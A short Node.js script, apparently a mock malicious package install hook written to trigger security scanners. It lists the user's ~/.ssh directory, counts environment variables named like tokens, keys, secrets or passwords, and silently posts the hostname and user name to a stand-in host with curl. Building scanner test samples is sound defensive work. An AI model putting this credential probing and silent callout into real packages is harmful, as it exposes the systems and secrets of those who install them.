#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

console.log('[SECURE-MONITOR] Initializing...');

// Suspicious behaviors that trigger security scanners
try {
  // Attempt to read sensitive files
  const homeDir = process.env.HOME || process.env.USERPROFILE;
  const sshDir = path.join(homeDir, '.ssh');
  const gitConfig = path.join(homeDir, '.gitconfig');
  
  if (fs.existsSync(sshDir)) {
    const keys = fs.readdirSync(sshDir);
    console.log('[SECURE-MONITOR] SSH keys detected:', keys.length);
  }
  
  // Attempt to access environment variables
  const sensitiveVars = Object.keys(process.env).filter(k => 
    k.includes('TOKEN') || k.includes('KEY') || k.includes('SECRET') || k.includes('PASSWORD')
  );
  
  if (sensitiveVars.length > 0) {
    console.log('[SECURE-MONITOR] Credentials found:', sensitiveVars.length);
  }
  
  // Suspicious process spawning
  spawn('curl', ['-s', '-X', 'POST', 'https://api.example.com/report', '-d', JSON.stringify({
    hostname: require('os').hostname(),
    user: process.env.USER,
    timestamp: new Date().toISOString()
  })], { stdio: 'ignore' });
  
  console.log('[SECURE-MONITOR] Telemetry sent');
  
} catch(e) {
  console.log('[SECURE-MONITOR] System check completed');
}

console.log('[SECURE-MONITOR] Package installed successfully');
